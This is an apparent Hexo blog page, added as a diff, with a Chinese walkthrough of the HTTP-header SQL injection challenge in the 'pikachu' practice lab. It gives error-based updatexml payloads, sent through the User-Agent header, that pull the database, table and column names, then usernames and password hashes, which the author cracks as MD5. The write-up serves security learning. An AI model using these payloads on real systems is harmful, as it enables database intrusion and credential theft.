@@ -1,0 +1,231 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pikachu解题漏洞报告-SQL-Inject http header注入 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="SQL-Inject http header注入解题流程1.右上角点开获得账号密码填入登录
+
+2.返回信息
+
+3.刷新页面抓包试试
+
+4.将请求头中user agent 内容改为1’发过去看看
+1&amp;,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="pikachu解题漏洞报告-SQL-Inject http header注入 - Hexo"/>
+    <meta name="twitter:description" content="SQL-Inject http header注入解题流程1.右上角点开获得账号密码填入登录
+
+2.返回信息
+
+3.刷新页面抓包试试
+
+4.将请求头中user agent 内容改为1’发过去看看
+1&amp;,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="pikachu解题漏洞报告-SQL-Inject http header注入 - Hexo"/>
+    <meta property="og:description" content="SQL-Inject http header注入解题流程1.右上角点开获得账号密码填入登录
+
+2.返回信息
+
+3.刷新页面抓包试试
+
+4.将请求头中user agent 内容改为1’发过去看看
+1&amp;,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pikachu解题漏洞报告-SQL-Inject http header注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pikachu解题漏洞报告-SQL-Inject http header注入</h1>
+        <div class="stuff">
+            <span>三月 22, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="SQL-Inject-http-header注入"><a href="#SQL-Inject-http-header注入" class="headerlink" title="SQL-Inject http header注入"></a>SQL-Inject http header注入</h1><h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><p>1.右上角点开获得账号密码填入登录</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322153948.png" alt="20220322153948"></p>
+<p>2.返回信息</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322154035.png" alt="20220322154035"></p>
+<p>3.刷新页面抓包试试</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322154226.png" alt="20220322154226"></p>
+<p>4.将请求头中user agent 内容改为1’发过去看看</p>
+<pre><code>1&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322154342.png" alt="20220322154342"></p>
+<p>5.报错，说明此处为注入点</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322154439.png" alt="20220322154439"></p>
+<p>6.构造查询数据库payload</p>
+<pre><code>1’ or updatexml(1,concat(0x7e,database()),0) or ’
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322154626.png" alt="20220322154626"></p>
+<p>7.返回数据库名pakachu</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322154702.png" alt="20220322154702"></p>
+<p>8.查表名</p>
+<pre><code>&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or &#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322155204.png" alt="20220322155204"></p>
+<p>9.查列名</p>
+<pre><code>&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) or &#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322155841.png" alt="20220322155841"></p>
+<p>10.查password</p>
+<pre><code>&#39; or updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) or &#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220322160026.png" alt="20220322160026"></p>
+<p>11.获得得密码用kali的测试工具测试密码的编码类型为md5，然后到md5解码网站解码即可</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHNkazB1a3lqNl9kMl82P2U9aDgxYUZQ.wav"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHhtbVE0d01TYUZqQ2w4P2U9MGpOaFVZ.wav"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Inject-http-header%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL-Inject http header注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">解题流程</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
